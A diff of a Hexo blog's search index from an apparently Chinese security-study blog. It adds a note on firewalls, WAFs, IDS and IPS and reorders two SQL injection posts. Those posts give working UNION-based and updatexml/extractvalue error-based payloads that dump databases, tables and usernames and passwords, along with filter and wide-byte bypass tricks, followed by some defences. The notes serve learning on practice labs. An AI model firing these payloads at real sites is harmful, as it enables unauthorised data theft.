     <content><![CDATA[<h1 id="1-web1"><a href="#1-web1" class="headerlink" title="1.web1"></a>1.web1</h1><h2 id="access注入"><a href="#access注入" class="headerlink" title="access注入"></a>access注入</h2><p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。<br>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。<br>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
@@ -12784,6 +12801,47 @@
       </categories>
       <tags>
         <tag>挖洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安全产品</title>
+    <url>/2023/07/01/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
+    <content><![CDATA[<p>作用，原理，部署位置</p>
+<h1 id="一、WF"><a href="#一、WF" class="headerlink" title="一、WF"></a>一、WF</h1><p>基础防火墙</p>
+<p>主要是可实现基本包过滤策略的防火墙，限制对IP:port的访问。</p>
+<p>基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。</p>
+<p> FW部署位置一般为外联出口或者区域性出口位置，对内外流量进行安全隔离。</p>
+<p>公共网络&lt;-边界路由器与核心交换机之间-&gt;(用户工作区、服务器组群)</p>
+<h1 id="二、WAF"><a href="#二、WAF" class="headerlink" title="二、WAF"></a>二、WAF</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</p>
+<p>流量识别、攻击检测、攻击响应、日志记录</p>
+<h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><strong>部署时要使WAF尽量靠近WEB服务器</strong>，对基于HTTP协议的通信进行检测和识别。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p>
+<p>sqlmap可以识别waf种类。</p>
+<p> 透明代理模式、反向代理模式、路由代理模式及端口镜像模式。</p>
+<p>前三种模式为线上，串行部署web服务器前端，检测并阻断异常流量。</p>
+<p>端口镜像模式将WAF旁路接在WEB服务器上游的交换机上，只用于检测异常流量。</p>
+<h1 id="三、IDS-被动"><a href="#三、IDS-被动" class="headerlink" title="三、IDS(被动)"></a>三、IDS(<strong>被动</strong>)</h1><p>IDS（入侵检测系统）就是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性</p>
+<p><strong>特点是不阻断任何网络访问，主要以提供报告和事后监督为主</strong></p>
+<p><strong>以旁路为主</strong></p>
+<h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>实时监测、安全审计、主动响应</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.信息收集</p>
+<p>收集的内容包括系统、网络、数据及用户活动的状态和行为</p>
+<p>2.数据分析</p>
+<p>模式匹配：收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</p>
+<p>统计分析：统计正常使用时的一些测量属性（如访问次数、操作失败 次数和延时等）。测量属性的平均值将被用来与网络、系统的行为进行比 较，任何观察值如果超过了正常值范围，就认为有入侵发生</p>
+<p>完整性分析：主要关注某个文件或对象是否被更改，这经常包括文件和 目录的内容及属性，它在发现被修改成类似特洛伊木马的应用程序方面特 别有效。</p>
+<h1 id="四、IPS（主动）"><a href="#四、IPS（主动）" class="headerlink" title="四、IPS（主动）"></a>四、IPS（主动）</h1><p> 解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong>(主要为模式匹配)</p>
+<p>缺点在于<strong>不能主动的学习</strong>攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许访问的。</p>
+<p><strong>常被串接在主干路上</strong></p>
+<h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><p>通过直接嵌入到网络流量中，利用一个网络端口接收外部流量，经过检查确认其中不包含异常活动或可疑内容，再通过另一个端口转发给内部系统（实际是对恶意流量进行清洗）。</p>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>过滤器，能够防止各种攻击</p>
+]]></content>
+      <categories>
+        <category>安全产品</category>
+      </categories>
+      <tags>
+        <tag>WF</tag>
+        <tag>WAF</tag>
+        <tag>IPS</tag>
       </tags>
   </entry>
   <entry>
@@ -16692,8 +16750,92 @@
       <tags>
         <tag>xss</tag>
         <tag>xxe</tag>
-        <tag>php反序列化</tag>
         <tag>csrf/ssrf</tag>
+        <tag>php反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-tips</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
+    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
+<p><strong>;%00</strong>代替–+进行注释</p>
+<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
+<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
+<p>没括号则是id&#x3D;2页面</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
+<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
+<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
+</blockquote>
+<blockquote>
+<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
+</blockquote>
+<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
+<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
+<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
+<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
+<p><strong>mysql_real_escape_string() 函数</strong></p>
+<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
+<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
+<ul>
+<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<blockquote>
+<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
+<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
+<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><code>limit m,n</code></p>
+<p>其中，m是偏移量，n是要查询的数量。</p>
+<blockquote>
+<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
+</blockquote>
+<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
+<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
+<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
+</li>
+<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
+</li>
+<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
+</li>
+<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
+<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
+<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
+</li>
+</ol>
+<p>危险参数过滤：</p>
+<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
+<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
+<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
+<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
+<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
+<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>Mysql爆破语句</tag>
+        <tag>注入绕过</tag>
+        <tag>sql注入技巧</tag>
+        <tag>sql注入防御</tag>
       </tags>
   </entry>
   <entry>
@@ -16925,6 +17067,33 @@
       </tags>
   </entry>
   <entry>
+    <title>sql注入之报错注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs</title>
     <url>/2023/05/20/sqli-labs/</url>
     <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
@@ -17021,33 +17190,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入之报错注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
-<blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>报错注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入之联合注入</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
@@ -17090,90 +17232,6 @@
       </categories>
       <tags>
         <tag>联合注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入-tips</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
-    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
-
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
-<p><strong>;%00</strong>代替–+进行注释</p>
-<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
-<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
-<p>没括号则是id&#x3D;2页面</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
-<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
-<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
-</blockquote>
-<blockquote>
-<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
-</blockquote>
-<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
-<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
-<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
-<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
-<p><strong>mysql_real_escape_string() 函数</strong></p>
-<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
-<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
-<ul>
-<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
-<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
-</ul>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-<blockquote>
-<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
-<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
-<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><code>limit m,n</code></p>
-<p>其中，m是偏移量，n是要查询的数量。</p>
-<blockquote>
-<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
-</blockquote>
-<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
-<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
-<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
-<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
-</li>
-<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
-</li>
-<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
-</li>
-<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
-<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
-<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
-</li>
-</ol>
-<p>危险参数过滤：</p>
